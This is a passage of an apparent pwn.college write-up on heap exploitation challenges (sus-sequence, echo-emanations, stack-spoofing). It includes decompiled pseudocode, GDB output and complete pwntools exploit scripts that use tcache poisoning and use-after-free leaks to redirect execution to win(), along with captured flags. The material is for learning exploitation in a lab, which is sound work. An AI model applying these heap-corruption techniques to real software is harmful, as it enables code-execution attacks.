                 U __libc_start_main@@GLIBC_2.2.5
00000000000014fd T main
0000000000001400 T win
```

The offset is the same as the easy version: `win_addr = leaked_main_addr - 0xfd`.

### Exploit

```python title="~/script.py" showLineNumbers
from pwn import *

p = process("/challenge/sus-sequence-hard", level='error')

p.recvuntil(b"allocations is at: ")
ptr_addr = int(p.recvuntil(b".").strip(b"."), 16)
p.recvuntil(b"main is at: ")
main_addr = int(p.recvuntil(b".").strip(b"."), 16)

win_addr = main_addr - 0xfd
ret_addr = ptr_addr + 0x118

print(f"[*] ptr:  {hex(ptr_addr)}")
print(f"[*] main: {hex(main_addr)}")
print(f"[*] win:  {hex(win_addr)}")
print(f"[*] ret:  {hex(ret_addr)}")

def malloc(idx, size):
    p.sendline(b"malloc")
    p.sendline(str(idx).encode())
    p.sendline(str(size).encode())
    p.recvuntil(b"quit): ")

def free(idx):
    p.sendline(b"free")
    p.sendline(str(idx).encode())
    p.recvuntil(b"quit): ")

def scanf(idx, data):
    p.sendline(b"scanf")
    p.sendline(str(idx).encode())
    p.sendline(data)
    p.recvuntil(b"quit): ")

malloc(0, 128)
malloc(1, 128)
free(1)
free(0)
scanf(0, p64(ret_addr))
malloc(0, 128)
malloc(1, 128)
scanf(1, p64(win_addr))

p.sendline(b"quit")
print(p.recvall().decode())
```

```
hacker@dynamic-allocator-misuse~sus-sequence-hard:/$ python ~/script.py 
[*] ptr:  0x7fff7069def0
[*] main: 0x558e484684fd
[*] win:  0x558e48468400
[*] ret:  0x7fff7069e008

Index: 


[*] Function (malloc/free/puts/scanf/quit): 
### Goodbye!
You win! Here is your flag:
pwn.college{YED_XcBS6yXPfpwGLSYH_3ZZMX2.0FM5MDL4ITM0EzW}
```

&nbsp;

## Echo Emanations (Easy)

```
hacker@dynamic-allocator-misuse~echo-emanations-easy:/$ /challenge/echo-emanations-easy
###
### Welcome to /challenge/echo-emanations-easy!
###

This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
challenges, you will become familiar with the concept of heap exploitation.

This challenge can manage up to 16 unique allocations.


[*] Function (malloc/free/echo/scanf/quit):
```

### Binary Analysis

```c title="/challenge/echo-emanations-easy :: main() :: Pseudocode" showLineNumbers
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  int v4; // eax
  unsigned int v6; // [rsp+2Ch] [rbp-124h]
  unsigned int v7; // [rsp+2Ch] [rbp-124h]
  unsigned int v8; // [rsp+2Ch] [rbp-124h]
  unsigned int v9; // [rsp+2Ch] [rbp-124h]
  unsigned int v10; // [rsp+30h] [rbp-120h]
  unsigned int size; // [rsp+34h] [rbp-11Ch]
  void *ptr[16]; // [rsp+40h] [rbp-110h] BYREF
  char s1[136]; // [rsp+C0h] [rbp-90h] BYREF
  unsigned __int64 v14; // [rsp+148h] [rbp-8h]

  v14 = __readfsqword(0x28u);
  setvbuf(stdin, nullptr, 2, 0);
  setvbuf(stdout, nullptr, 2, 1u);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  memset(ptr, 0, sizeof(ptr));
  puts(
    "This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of");
  puts("challenges, you will become familiar with the concept of heap exploitation.\n");
  printf("This challenge can manage up to %d unique allocations.\n\n", 16);
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          print_TCACHE(main_thread_TCACHE);
          puts(byte_3529);
          printf("[*] Function (malloc/free/echo/scanf/quit): ");
          __isoc99_scanf("%127s", s1);
          puts(byte_3529);
          if ( strcmp(s1, "malloc") )
            break;
          printf("Index: ");
          __isoc99_scanf("%127s", s1);
          puts(byte_3529);
          v6 = atoi(s1);
          if ( v6 > 0xF )
            __assert_fail("allocation_index < 16", "<stdin>", 0x110u, "main");
          printf("Size: ");
          __isoc99_scanf("%127s", s1);
          puts(byte_3529);
          size = atoi(s1);
          printf("[*] allocations[%d] = malloc(%d)\n", v6, size);
          ptr[v6] = malloc(size);
          printf("[*] allocations[%d] = %p\n", v6, ptr[v6]);
        }
        if ( strcmp(s1, "free") )
          break;
        printf("Index: ");
        __isoc99_scanf("%127s", s1);
        puts(byte_3529);
        v7 = atoi(s1);
        if ( v7 > 0xF )
          __assert_fail("allocation_index < 16", "<stdin>", 0x122u, "main");
        printf("[*] free(allocations[%d])\n", v7);
        free(ptr[v7]);
      }
      if ( strcmp(s1, "echo") )
        break;
      printf("Index: ");
      __isoc99_scanf("%127s", s1);
      puts(byte_3529);
      v8 = atoi(s1);
      if ( v8 > 0xF )
        __assert_fail("allocation_index < 16", "<stdin>", 0x12Fu, "main");
      printf("Offset: ");
      __isoc99_scanf("%127s", s1);
      puts(byte_3529);
      v10 = atoi(s1);
      printf("[*] echo(allocations[%d], %d)\n", v8, v10);
      echo(ptr[v8], v10);
    }
    if ( strcmp(s1, "scanf") )
      break;
    printf("Index: ");
    __isoc99_scanf("%127s", s1);
    puts(byte_3529);
    v9 = atoi(s1);
    if ( v9 > 0xF )
      __assert_fail("allocation_index < 16", "<stdin>", 0x140u, "main");
    v3 = malloc_usable_size(ptr[v9]);
    sprintf(s1, "%%%us", v3);
    v4 = malloc_usable_size(ptr[v9]);
    printf("[*] scanf(\"%%%us\", allocations[%d])\n", v4, v9);
    __isoc99_scanf(s1, ptr[v9]);
    puts(byte_3529);
  }
  if ( strcmp(s1, "quit") )
    puts("Unrecognized choice!");
  puts("### Goodbye!");
  return 0;
}
```

```c title="/challenge/echo-emanations-easy :: echo() :: Pseudocode" showLineNumbers
unsigned __int64 __fastcall echo(__int64 a1, __int64 a2)
{
  char **argv; // [rsp+18h] [rbp-18h]
  char v4[6]; // [rsp+22h] [rbp-Eh] BYREF
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  strcpy(v4, "Data:");
  argv = (char **)malloc(0x20u);
  *argv = "/bin/echo";
  argv[1] = v4;
  argv[2] = (char *)(a1 + a2);
  argv[3] = nullptr;
  if ( !fork() )
  {
    execve(*argv, argv, nullptr);
    exit(0);
  }
  wait(0);
  return __readfsqword(0x28u) ^ v5;
}
```

This challenge has no startup leaks and no `send_flag`. The goal is the same as the sus-sequence challenges: overwrite `main()`'s return address with `win()` via TCACHE poisoning. The difference is that we have to obtain the leaks ourselves using the `echo` command.

The `echo` command takes an index and an offset, and calls `execve("/bin/echo", argv, NULL)` where `argv[2] = ptr[idx] + offset`. This prints the bytes at that address as a string, giving us an arbitrary read within any allocation at any offset.

### Leaking via Echo's Internal Chunk

Every time `echo` is called, it runs `malloc(0x20)` internally. Looking at the source:

```c title="/challenge/echo-emanations-easy :: echo() :: Pseudocode" showLineNumbers
# ---- snip ----

char v4[6]; // [rsp+22h] [rbp-Eh] BYREF
// ...
strcpy(v4, "Data:");
argv = (char **)malloc(0x20u);
*argv       = "/bin/echo";        // argv[0] = address of "/bin/echo" in the binary
argv[1]     = v4;                 // argv[1] = address of v4 on echo's stack
argv[2]     = (char *)(a1 + a2); // argv[2] = ptr[idx] + offset
argv[3]     = nullptr;

# ---- snip ----
```

`argv` is just a pointer to whatever `malloc` returns. Every assignment to `argv[0]`, `argv[1]`, `argv[2]`, `argv[3]` writes directly into that chunk's memory at offsets 0, 8, 16, 24 respectively since each pointer is 8 bytes wide. So after those four lines, the chunk contains a binary address at offset 0 and a stack address at offset 8.

`v4` is a 6-byte array on echo's stack holding the string `"Data:"`. When echo does `argv[1] = v4`, it stores the address of this stack variable into the chunk, giving us a pointer into echo's own stack frame.

This chunk is never freed. However, if we free one of our own 32-byte chunks into the TCACHE first, echo's internal `malloc(0x20)` will pop it. Our dangling `ptr[0]` still points to that chunk, so we can call `echo` again to read the pointers echo wrote into it.

The sequence is:

1. `malloc(0, 32)`: allocate chunk A
2. `free(0)`: put chunk A into TCACHE bin for 25-40 byte chunks
3. `echo(0, 0)`: echo's `malloc(0x20)` pops chunk A from the TCACHE and writes its argv pointers into it. `ptr[0]` still points to chunk A since `free` never clears it.
4. `echo(0, 0)`: `/bin/echo` prints the bytes at `ptr[0] + 0`, which is `argv[0]`, the address of `"/bin/echo"` in the binary
5. `echo(0, 8)`: `/bin/echo` prints the bytes at `ptr[0] + 8`, which is `argv[1]`, the address of `v4` on echo's stack

```
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  chunk A (ptr[0], also echo's internal argv array)    ┆
├───────────────────────────────────────────────────────┤
│  +0x00: argv[0] = &"/bin/echo"  <- binary leak        │
├───────────────────────────────────────────────────────┤
│  +0x08: argv[1] = &v4           <- stack leak         │
├───────────────────────────────────────────────────────┤
│  +0x10: argv[2] = ptr[0] + 0    <- heap address       │
├───────────────────────────────────────────────────────┤
│  +0x18: argv[3] = NULL                                │
└───────────────────────────────────────────────────────┘
```

### Calculating `win()` and `ret`

`"/bin/echo"` lives at file offset `0x33f8` in the binary:

```
hacker@dynamic-allocator-misuse~echo-emanations-easy:/$ python3 -c "
data = open('/challenge/echo-emanations-easy', 'rb').read()
print(hex(data.find(b'/bin/echo')))
"
0x33f8
```

```
hacker@dynamic-allocator-misuse~echo-emanations-easy:/$ nm /challenge/echo-emanations-easy | grep -E "main|win"
                 U __libc_start_main@@GLIBC_2.2.5
0000000000001cce T main
0000000000005048 B main_thread_TCACHE
0000000000001b00 T win
```

So:
```
base     = bin_leak - 0x33f8
win_addr = base + 0x1b00
```

For the stack leak, `argv[1]` points to `v4` which is at `[rbp-0xe]` inside echo's frame. We find the fixed offset between `v4` and main's return address using GDB:

```
pwndbg> break echo
Breakpoint 1 at 0x1c09
pwndbg> run
Starting program: /challenge/echo-emanations-easy 
Downloading separate debug info for system-supplied DSO at 0x7fff427d3000
Download failed: Invalid argument.  Continuing without separate debug info for system-supplied DSO at 0x7fff427d3000.                                                                                   
###
### Welcome to /challenge/echo-emanations-easy!
###

This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
challenges, you will become familiar with the concept of heap exploitation.

This challenge can manage up to 16 unique allocations.


[*] Function (malloc/free/echo/scanf/quit): malloc

Index: 0

Size: 32

[*] allocations[0] = malloc(32)
[*] allocations[0] = 0x5f3e7a3c02c0

[*] Function (malloc/free/echo/scanf/quit): free

Index: 0

[*] free(allocations[0])
+====================+========================+==============+============================+============================+
| TCACHE BIN #1      | SIZE: 25 - 40          | COUNT: 1     | HEAD: 0x5f3e7a3c02c0       | KEY: 0x5f3e7a3c0010        |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x5f3e7a3c02c0      | 0                   | 0x31 (P)                     | (nil)               | 0x5f3e7a3c0010      |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/echo/scanf/quit): echo

Index: 0

Offset: 0

[*] echo(allocations[0], 0)

Breakpoint 1, 0x00005f3e5bba0c09 in echo ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────────────────────────────────────────────────────────────────────────────[ LAST SIGNAL ]─────────────────────────────────────────────────────────────────────────────────────────────
Breakpoint hit at 0x5f3e5bba0c09
─────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────────────
 RAX  0x5f3e7a3c02c0 ◂— 0
 RBX  0x5f3e5bba12e0 (__libc_csu_init) ◂— endbr64
 RCX  0
 RDX  0
 RDI  0x5f3e7a3c02c0 ◂— 0
 RSI  0
 R8   0x1c
 R9   0x1c
 R10  0x5f3e5bba2624 ◂— 0x666e616373000a29 /* ')\n' */
 R11  0x246
 R12  0x5f3e5bba0400 (_start) ◂— endbr64
 R13  0x7fff427b7eb0 ◂— 1
 R14  0
 R15  0
 RBP  0x7fff427b7c60 —▸ 0x7fff427b7dc0 ◂— 0
 RSP  0x7fff427b7c30 —▸ 0x7fff427b7dc0 ◂— 0
 RIP  0x5f3e5bba0c09 (echo+12) ◂— mov qword ptr [rbp - 0x28], rdi
──────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────────────
 ► 0x5f3e5bba0c09 <echo+12>    mov    qword ptr [rbp - 0x28], rdi           [0x7fff427b7c38] <= 0x5f3e7a3c02c0 ◂— 0
   0x5f3e5bba0c0d <echo+16>    mov    qword ptr [rbp - 0x30], rsi           [0x7fff427b7c30] <= 0
   0x5f3e5bba0c11 <echo+20>    mov    rax, qword ptr fs:[0x28]              RAX, [0x7269b50ea568] => 0x2863de3a38c21100
   0x5f3e5bba0c1a <echo+29>    mov    qword ptr [rbp - 8], rax              [0x7fff427b7c58] <= 0x2863de3a38c21100
   0x5f3e5bba0c1e <echo+33>    xor    eax, eax                              EAX => 0
   0x5f3e5bba0c20 <echo+35>    mov    dword ptr [rbp - 0xe], 0x61746144     [0x7fff427b7c52] <= 0x61746144
   0x5f3e5bba0c27 <echo+42>    mov    word ptr [rbp - 0xa], 0x3a            [0x7fff427b7c56] <= 0x3a
   0x5f3e5bba0c2d <echo+48>    mov    edi, 0x20                             EDI => 0x20
   0x5f3e5bba0c32 <echo+53>    call   malloc@plt                  <malloc@plt>
 
   0x5f3e5bba0c37 <echo+58>    mov    qword ptr [rbp - 0x18], rax
   0x5f3e5bba0c3b <echo+62>    mov    rax, qword ptr [rbp - 0x18]
───────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fff427b7c30 —▸ 0x7fff427b7dc0 ◂— 0
01:0008│-028 0x7fff427b7c38 —▸ 0x5f3e5bba0400 (_start) ◂— endbr64
02:0010│-020 0x7fff427b7c40 —▸ 0x7fff427b7eb0 ◂— 1
03:0018│-018 0x7fff427b7c48 ◂— 0
04:0020│-010 0x7fff427b7c50 ◂— 0
05:0028│-008 0x7fff427b7c58 —▸ 0x7269b4f3b5c4 (atoi+20) ◂— add rsp, 8
06:0030│ rbp 0x7fff427b7c60 —▸ 0x7fff427b7dc0 ◂— 0
07:0038│+008 0x7fff427b7c68 —▸ 0x5f3e5bba114e (main+1152) ◂— jmp main+254
─────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────
 ► 0   0x5f3e5bba0c09 echo+12
   1   0x5f3e5bba114e main+1152
   2   0x7269b4f1b083 __libc_start_main+243
   3   0x5f3e5bba042e _start+46
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

From this we can extract:

- `echo()`'s `rbp` = `0x7fff427b7c60`
- `echo()`'s `v4` is at `rbp-0xe` = `0x7fff427b7c52`
- `main()`'s `rbp` = `0x7fff427b7dc0` (stored at `echo()`'s `rbp+0x00`)
- `main()`'s return address is at `main()`'s `rbp+0x8` = `0x7fff427b7dc8`

```
offset = 0x7fff427b7dc8 - 0x7fff427b7c52 = 0x176
```

So `ret_addr = stack_leak + 0x176`.

### Exploit

```python title="~/script.py" showLineNumbers
from pwn import *

p = process("/challenge/echo-emanations-easy")

p.recvuntil(b"quit): ")

def malloc(idx, size):
    p.sendline(b"malloc")
    p.sendline(str(idx).encode())
    p.sendline(str(size).encode())
    p.recvuntil(b"quit): ")

def free(idx):
    p.sendline(b"free")
    p.sendline(str(idx).encode())
    p.recvuntil(b"quit): ")

def echo(idx, offset):
    p.sendline(b"echo")
    p.sendline(str(idx).encode())
    p.sendline(str(offset).encode())
    p.recvuntil(b"Data: ")
    data = p.recvuntil(b"\n", drop=True)
    p.recvuntil(b"quit): ")
    return data

def scanf(idx, data):
    p.sendline(b"scanf")
    p.sendline(str(idx).encode())
    p.sendline(data)
    p.recvuntil(b"quit): ")

# allocate and free a 32-byte chunk to match echo's internal malloc size
malloc(0, 32)
free(0)

# trigger echo to populate chunk A with its argv pointers
echo(0, 0)

# read the leaks back
bin_leak   = echo(0, 0).ljust(8, b"\x00")[:8]
stack_leak = echo(0, 8).ljust(8, b"\x00")[:8]

bin_addr   = u64(bin_leak)
stack_addr = u64(stack_leak)

base     = bin_addr - 0x33f8
win_addr = base + 0x1b00
ret_addr = stack_addr + 0x176

print(f"[*] bin leak:   {hex(bin_addr)}")
print(f"[*] stack leak: {hex(stack_addr)}")
print(f"[*] base:       {hex(base)}")
print(f"[*] win:        {hex(win_addr)}")
print(f"[*] ret:        {hex(ret_addr)}")

# TCACHE poisoning to overwrite main's return address with win
malloc(0, 128)
malloc(1, 128)
free(1)
free(0)
scanf(0, p64(ret_addr))
malloc(0, 128)
malloc(1, 128)
scanf(1, p64(win_addr))

p.sendline(b"quit")
print(p.recvall().decode())
```

```
hacker@dynamic-allocator-misuse~echo-emanations-easy:/$ python ~/script.py 
[+] Starting local process '/challenge/echo-emanations-easy': pid 22792
[*] bin leak:   0x5fa64c6693f8
[*] stack leak: 0x7ffc2f2a84c2
[*] base:       0x5fa64c666000
[*] win:        0x5fa64c667b00
[*] ret:        0x7ffc2f2a8638
[+] Receiving all data: Done (101B)
[*] Process '/challenge/echo-emanations-easy' stopped with exit code -11 (SIGSEGV) (pid 22792)

### Goodbye!
You win! Here is your flag:
pwn.college{oltNDhu89yFosTi_YN8r9ALBFq8.0VM5MDL4ITM0EzW}
```

&nbsp;

## Echo Emanations (Hard)

```
hacker@dynamic-allocator-misuse~echo-emanations-hard:/$ /challenge/echo-emanations-hard
###
### Welcome to /challenge/echo-emanations-hard!
###


[*] Function (malloc/free/echo/scanf/quit):
```

The solution is the same as the [easy version](#echo-emanations-easy). The only differences are that there is no `print_TCACHE` display, and we have to find the file offset of `"/bin/echo"` and the address of `win()` from the binary ourselves.

### Binary Analysis

```c title="/challenge/echo-emanations-hard :: main() :: Pseudocode" showLineNumbers
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  unsigned int v5; // [rsp+2Ch] [rbp-124h]
  unsigned int v6; // [rsp+2Ch] [rbp-124h]
  unsigned int v7; // [rsp+2Ch] [rbp-124h]
  unsigned int v8; // [rsp+2Ch] [rbp-124h]
  unsigned int v9; // [rsp+30h] [rbp-120h]
  unsigned int size; // [rsp+34h] [rbp-11Ch]
  void *ptr[16]; // [rsp+40h] [rbp-110h] BYREF
  char s1[136]; // [rsp+C0h] [rbp-90h] BYREF
  unsigned __int64 v13; // [rsp+148h] [rbp-8h]

  v13 = __readfsqword(0x28u);
  setvbuf(stdin, nullptr, 2, 0);
  setvbuf(stdout, nullptr, 2, 1u);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  memset(ptr, 0, sizeof(ptr));
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          puts(byte_2132);
          printf("[*] Function (malloc/free/echo/scanf/quit): ");
          __isoc99_scanf("%127s", s1);
          puts(byte_2132);
          if ( strcmp(s1, "malloc") )
            break;
          printf("Index: ");
          __isoc99_scanf("%127s", s1);
          puts(byte_2132);
          v5 = atoi(s1);
          if ( v5 > 0xF )
            __assert_fail("allocation_index < 16", "<stdin>", 0x6Eu, "main");
          printf("Size: ");
          __isoc99_scanf("%127s", s1);
          puts(byte_2132);
          size = atoi(s1);
          ptr[v5] = malloc(size);
        }
        if ( strcmp(s1, "free") )
          break;
        printf("Index: ");
        __isoc99_scanf("%127s", s1);
        puts(byte_2132);
        v6 = atoi(s1);
        if ( v6 > 0xF )
          __assert_fail("allocation_index < 16", "<stdin>", 0x7Eu, "main");
        free(ptr[v6]);
      }
      if ( strcmp(s1, "echo") )
        break;
      printf("Index: ");
      __isoc99_scanf("%127s", s1);
      puts(byte_2132);
      v7 = atoi(s1);
      if ( v7 > 0xF )
        __assert_fail("allocation_index < 16", "<stdin>", 0x8Au, "main");
      printf("Offset: ");
      __isoc99_scanf("%127s", s1);
      puts(byte_2132);
      v9 = atoi(s1);
      echo(ptr[v7], v9);
    }
    if ( strcmp(s1, "scanf") )
      break;
    printf("Index: ");
    __isoc99_scanf("%127s", s1);
    puts(byte_2132);
    v8 = atoi(s1);
    if ( v8 > 0xF )
      __assert_fail("allocation_index < 16", "<stdin>", 0x9Au, "main");
    v3 = malloc_usable_size(ptr[v8]);
    sprintf(s1, "%%%us", v3);
    __isoc99_scanf(s1, ptr[v8]);
    puts(byte_2132);
  }
  if ( strcmp(s1, "quit") )
    puts("Unrecognized choice!");
  puts("### Goodbye!");
  return 0;
}
```

```c title="/challenge/echo-emanations-hard :: echo() :: Pseudocode" showLineNumbers
unsigned __int64 __fastcall echo(__int64 a1, __int64 a2)
{
  char **argv; // [rsp+18h] [rbp-18h]
  char v4[6]; // [rsp+22h] [rbp-Eh] BYREF
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  strcpy(v4, "Data:");
  argv = (char **)malloc(0x20u);
  *argv = "/bin/echo";
  argv[1] = v4;
  argv[2] = (char *)(a1 + a2);
  argv[3] = nullptr;
  if ( !fork() )
  {
    execve(*argv, argv, nullptr);
    exit(0);
  }
  wait(0);
  return __readfsqword(0x28u) ^ v5;
}
```

```
hacker@dynamic-allocator-misuse~echo-emanations-hard:/$ python3 -c "
data = open('/challenge/echo-emanations-hard', 'rb').read()
print(hex(data.find(b'/bin/echo')))
"
# 0x2110
```

```
hacker@dynamic-allocator-misuse~echo-emanations-hard:/$ nm /challenge/echo-emanations-hard | grep -E "main|win"
# 00000000000016ce T main
# 0000000000001500 T win
```

The `echo` function is identical to the easy version and `ptr` sits at the same stack offset `[rbp-0x110]` in both binaries, so the offset between `v4` and main's return address remains `0x176`.

### Exploit

```python title="~/script.py" showLineNumbers
from pwn import *

p = process("/challenge/echo-emanations-hard")

p.recvuntil(b"quit): ")

def malloc(idx, size):
    p.sendline(b"malloc")
    p.sendline(str(idx).encode())
    p.sendline(str(size).encode())
    p.recvuntil(b"quit): ")

def free(idx):
    p.sendline(b"free")
    p.sendline(str(idx).encode())
    p.recvuntil(b"quit): ")

def echo(idx, offset):
    p.sendline(b"echo")
    p.sendline(str(idx).encode())
    p.sendline(str(offset).encode())
    p.recvuntil(b"Data: ")
    data = p.recvuntil(b"\n", drop=True)
    p.recvuntil(b"quit): ")
    return data

def scanf(idx, data):
    p.sendline(b"scanf")
    p.sendline(str(idx).encode())
    p.sendline(data)
    p.recvuntil(b"quit): ")

malloc(0, 32)
free(0)
echo(0, 0)

bin_leak   = echo(0, 0).ljust(8, b"\x00")[:8]
stack_leak = echo(0, 8).ljust(8, b"\x00")[:8]

bin_addr   = u64(bin_leak)
stack_addr = u64(stack_leak)

base     = bin_addr - 0x2110
win_addr = base + 0x1500
ret_addr = stack_addr + 0x176

print(f"[*] bin leak:   {hex(bin_addr)}")
print(f"[*] stack leak: {hex(stack_addr)}")
print(f"[*] base:       {hex(base)}")
print(f"[*] win:        {hex(win_addr)}")
print(f"[*] ret:        {hex(ret_addr)}")

malloc(0, 128)
malloc(1, 128)
free(1)
free(0)
scanf(0, p64(ret_addr))
malloc(0, 128)
malloc(1, 128)
scanf(1, p64(win_addr))

p.sendline(b"quit")
print(p.recvall().decode())
```

```
hacker@dynamic-allocator-misuse~echo-emanations-hard:/$ python ~/script.py
[*] bin leak:   0x5851ffb97110
[*] stack leak: 0x7ffc59d84042
[*] base:       0x5851ffb95000
[*] win:        0x5851ffb96500
[*] ret:        0x7ffc59d841b8

### Goodbye!
You win! Here is your flag:
pwn.college{0TBO3SAF54zAWFKEBdJ_Tlj0I3C.0lM5MDL4ITM0EzW}
```

&nbsp;

## Stack Spoofing (Easy)

```
hacker@dynamic-allocator-misuse~stack-spoofing-easy:/$ /challenge/stack-spoofing-easy
###
### Welcome to /challenge/stack-spoofing-easy!
###

This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
challenges, you will become familiar with the concept of heap exploitation.

This challenge can manage up to 16 unique allocations.


[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/stack_malloc_win/quit):
```

### Binary Analysis

```c title="/challenge/stack-spoofing-easy :: main() :: Pseudocode" showLineNumbers
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  int v4; // eax
  unsigned int v6; // [rsp+28h] [rbp-1A8h]
  unsigned int v7; // [rsp+28h] [rbp-1A8h]
  unsigned int v8; // [rsp+28h] [rbp-1A8h]
  unsigned int v9; // [rsp+28h] [rbp-1A8h]
  unsigned int size; // [rsp+2Ch] [rbp-1A4h]
  _QWORD *v11; // [rsp+38h] [rbp-198h]
  void *ptr[16]; // [rsp+40h] [rbp-190h] BYREF
  char s1[128]; // [rsp+C0h] [rbp-110h] BYREF
  _BYTE v14[64]; // [rsp+140h] [rbp-90h] BYREF
  _QWORD v15[10]; // [rsp+180h] [rbp-50h] BYREF

  v15[9] = __readfsqword(0x28u);
  setvbuf(stdin, nullptr, 2, 0);
  setvbuf(stdout, nullptr, 2, 1u);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  memset(ptr, 0, sizeof(ptr));
  puts(
    "This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of");
  puts("challenges, you will become familiar with the concept of heap exploitation.\n");
  printf("This challenge can manage up to %d unique allocations.\n\n", 16);
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          while ( 1 )
          {
            while ( 1 )
            {
              while ( 1 )
              {
                print_TCACHE(main_thread_TCACHE);
                puts(byte_3519);
                printf("[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/stack_malloc_win/quit): ");
                __isoc99_scanf("%127s", s1);
                puts(byte_3519);
                if ( strcmp(s1, "malloc") )
                  break;
                printf("Index: ");
                __isoc99_scanf("%127s", s1);
                puts(byte_3519);
                v6 = atoi(s1);
                if ( v6 > 0xF )
                  __assert_fail("allocation_index < 16", "<stdin>", 0xFCu, "main");
                printf("Size: ");
                __isoc99_scanf("%127s", s1);
                puts(byte_3519);
                size = atoi(s1);
                printf("[*] allocations[%d] = malloc(%d)\n", v6, size);
                ptr[v6] = malloc(size);
                printf("[*] allocations[%d] = %p\n", v6, ptr[v6]);
              }
              if ( strcmp(s1, "free") )
                break;
              printf("Index: ");
              __isoc99_scanf("%127s", s1);
              puts(byte_3519);
              v7 = atoi(s1);
              if ( v7 > 0xF )
                __assert_fail("allocation_index < 16", "<stdin>", 0x10Eu, "main");
              printf("[*] free(allocations[%d])\n", v7);
              free(ptr[v7]);
            }
            if ( strcmp(s1, "puts") )
              break;
            printf("Index: ");
            __isoc99_scanf("%127s", s1);
            puts(byte_3519);
            v8 = atoi(s1);
            if ( v8 > 0xF )
              __assert_fail("allocation_index < 16", "<stdin>", 0x11Bu, "main");
            printf("[*] puts(allocations[%d])\n", v8);
            printf("Data: ");
            puts((const char *)ptr[v8]);
          }
          if ( strcmp(s1, "scanf") )
            break;
          printf("Index: ");
          __isoc99_scanf("%127s", s1);
          puts(byte_3519);
          v9 = atoi(s1);
          if ( v9 > 0xF )
            __assert_fail("allocation_index < 16", "<stdin>", 0x128u, "main");
          v3 = malloc_usable_size(ptr[v9]);
          sprintf(s1, "%%%us", v3);
          v4 = malloc_usable_size(ptr[v9]);
          printf("[*] scanf(\"%%%us\", allocations[%d])\n", v4, v9);
          __isoc99_scanf(s1, ptr[v9]);
          puts(byte_3519);
        }
        if ( strcmp(s1, "stack_free") )
          break;
        printf("[*] free(%p)\n", v15);
        free(v15);
      }
      if ( strcmp(s1, "stack_scanf") )
        break;
      printf("[*] scanf(\"%%127s\", %p)\n", v14);
      __isoc99_scanf("%127s", v14);
      puts(byte_3519);
    }
    if ( strcmp(s1, "stack_malloc_win") )
      break;
    printf("[*] if (malloc(%d) == %p) win()\n", 63, v15);
    printf("[*] malloc_usable_size(malloc(%d)) = %d\n", 63, 72);
    v11 = malloc(0x3Fu);
    printf("[*] malloc(%d) = %p\n", 63, v11);
    if ( v11 == v15 )
      win();
  }
  if ( strcmp(s1, "quit") )
    puts("Unrecognized choice!");
  puts("### Goodbye!");
  return 0;
}
```

This challenge introduces three new commands. `stack_free` frees `v15`, a stack-allocated buffer. `stack_scanf` writes into `v14`, another stack buffer. `stack_malloc_win` calls `malloc(63)` and calls `win()` if the result equals `v15`.

The goal is to make `malloc(63)` return the address of `v15` on the stack.

### Getting a Stack Address into the Tcache

We cannot call `stack_free` directly to put `v15` into the TCACHE, the allocator detects that `v15` is not a valid heap chunk and aborts:

```
[*] free(0x7ffcd1c04590)
double free or corruption (out)
Aborted
```

Instead we use TCACHE poisoning. The `stack_malloc_win` command helpfully prints `v15`'s address before doing the malloc check, so we can read it from the output. We then poison a freed heap chunk's `next` pointer to point at `v15`, causing the next `malloc(63)` call to return the `v15` chunk.

The TCACHE bin for `malloc(63)` is the 57-72 byte bin (bin `#3`). We allocate two chunks of size 72 to match this bin, free them, and poison the first chunk's `next`:

```
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┊  TCACHE_perthread_struct Void                                         ┊
┊            ┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┓                        ┊
┊    counts: ┃ count_72: 2    ┃ ...            ┃                        ┊
┊            ┣━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━┫                        ┊
┊   entries: ┃ entry_72: &A   ┃ ...            ┃                        ┊
┊            ┗━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┛                        ┊
